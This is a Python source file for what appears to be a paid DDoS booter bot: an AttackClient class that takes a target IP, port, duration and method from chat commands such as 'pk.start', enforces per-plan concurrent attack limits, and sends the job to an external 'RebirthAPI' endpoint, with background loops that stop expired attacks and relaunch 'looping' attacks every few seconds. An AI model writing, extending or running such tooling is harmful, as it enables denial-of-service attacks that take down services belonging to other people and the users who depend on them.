import datetime
import time
from datetime import datetime, timedelta
from types import SimpleNamespace
from typing import List

import requests
from data.attack import Attack

from src import manage


class AttackClient:
    def __init__(self, config: SimpleNamespace):
        self.config = config

    def attack(self, atk: Attack) -> str:
        if any(x == None for x in [atk.IP, atk.Port, atk.Time, atk.Method]): 
            return "**Correct usage:** `pk.start <IP> <Port> <Time> <Method>`"

        usersAttacks = manage.users_attacks(atk.User.UserID)

        if len(usersAttacks) >= atk.User.Cons:
            return f"**You have reached your plan**: `You have reached your concurrent limit {atk.User.Cons}/{atk.User.Cons}`"

        if 0 < int(atk.Port) > 65535 or 0 < atk.Time > self.config.api.MaxTime: 
            return f"**Valid Port:** `1-65535`\n**Valid Time:** `0-{self.config.api.MaxTime}`"

        apiRes = requests.get(self.config.urls.RebirthAPI % (atk.IP, atk.Port, atk.Time, atk.Method)).json()
        if apiRes['success']: 
           manage.start_attack(atk)

        return apiRes['message'].split('-')[0]
        
    def stop(self, atk: Attack) -> str:
        if atk.IP == None: return "**Correct usage:** `pk.stop <IP>`"

        apiRes = requests.get(self.config.urls.RebirthAPI % (atk.IP, 1, 1, "STOP")).json()
        if apiRes['success']:
           manage.stop_attack(atk)

        return apiRes['message'].split('-')[0]

    def start_loop(self, atk: Attack) -> str:
        if any(x == None for x in [atk.IP, atk.Port, atk.Time]): 
            return "**Correct usage:** `pk.loop <IP> <Port> <Method>`"

        if 0 < atk.Port > 65535: 
            return f"**Valid Port:** `1-65535`\n**Valid Time:** `0-{self.config.api.MaxTime}`"

        apiRes = requests.get(self.config.urls.RebirthAPI % (atk.IP, atk.Port, atk.Time, atk.Method)).json()
        if apiRes['success']: 
           manage.loop_attack(atk)
           return apiRes['message'].split('-')[0]
        
        else: return f"`{apiRes['message']}`"

    def stop_loop(self, atk: Attack):
        if atk.IP == None: return "**Correct usage:** `pk.stoploop <IP>`"
        return manage.loop_kill(atk)

    def stop_all(self) -> str:
        return manage.stop_all()

    def get_attacks(self) -> List[Attack]:
        return manage.get_attacks()

    def _manage_active(self):
        while True:
            if len(manage.activeAttacks) > 0:
                [manage.stop_attack(atk) 
                    for atk in manage.activeAttacks 
                        if datetime.strptime(atk.EndDate, "%Y-%m-%d %H:%M:%S.%f") <= datetime.now()]
            
            time.sleep(1)

    def _manage_loop(self):
        while True:
            if len(manage.loopingAttacks) > 0:
                for atk in manage.loopingAttacks:
                    if datetime.strptime(atk.LoopDate, "%Y-%m-%d %H:%M:%S.%f") <= datetime.now():
                        atk.EndDate = datetime.now() + timedelta(seconds=atk.Time)
                        atk.LoopDate = atk.EndDate + timedelta(seconds=8)

                        apiRes = requests.get(self.config.urls.RebirthAPI).json()
                        if apiRes['success']: print(f"[{atk.User.UserID} ({atk.User.User})]: {apiRes['message']}")
            time.sleep(1)
    